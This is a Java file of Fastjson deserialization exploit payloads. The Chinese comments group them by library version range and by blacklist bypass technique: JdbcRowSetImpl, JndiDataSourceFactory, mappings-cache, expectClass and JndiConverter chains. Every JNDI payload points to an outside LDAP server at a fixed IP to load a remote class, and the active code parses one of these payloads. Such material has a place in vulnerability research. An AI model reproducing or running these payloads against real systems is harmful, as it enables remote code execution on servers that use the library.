package fasjsonxxxx;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;


public class Fastjson125 {
    public static void main(String[] args) {


                /*
        JdbcRowSetImpl调用链 1.2.25-1.2.41（autoTypeSupport为True）黑名单绕过之老类格式绕过
         */
//        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
//        String payload = "{\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl;\",\"dataSourceName\":\"ldap://121.196.109.163:8891/Evalclass\",\"autoCommit\":true}";


        /*
        JdbcRowSetImpl调用链 1.42-1.45(autoTypeSupport为true) 黑名单绕过之找到新类
         */

//        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
//        String payload1 = "{\n" +
//                "        \"@type\":\"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\",\n" +
//                "        \"properties\":{\n" +
//                "            \"data_source\":\"ldap://121.196.109.163:8891/Evalclass\"\n" +
//                "        }\n" +
//                "}";
        /*
        缓存mappings绕过 1.25-1.47通杀（不管supportAutoType是true还是false）
         */
//        {"\"a\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"b\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://121.196.109.163:8891/Evalclass\",\"autoCommit\":true}}

//        String payloadforall ="{\n" +
//                "    \"a\":{\n" +
//                "        \"@type\":\"java.lang.Class\",\n" +
//                "        \"val\":\"com.sun.rowset.JdbcRowSetImpl\"\n" +
//                "    },\n" +
//                "    \"b\":{\n" +
//                "        \"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\n" +
//                "        \"dataSourceName\":\"ldap://121.196.109.163:8891/Evalclass\",\n" +
//                "        \"autoCommit\":true\n" +
//                "    }\n" +
//                "}";

        /*
        1.2.48-1.2.68
        利用expectClass类绕过，需要找本地类配合，或者冲jdk中找
         */
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
//        String payload = "{\"@type\":\"java.lang.AutoCloseable\", \"@type\":\"fasjsonxxxx.Thecmd\", \"cmd\":\"calc.exe\"}";


        /*
        <=1.2.62  JNDI 注入，添加xbean-reflect 依赖
         */
        String payload2 ="{\"@type\":\"org.apache.xbean.propertyeditor.JndiConverter\",\"AsText\":\"ldap://121.196.109.163:8891/Evalclass\"}";

        JSON.parse(payload2);
    }
}
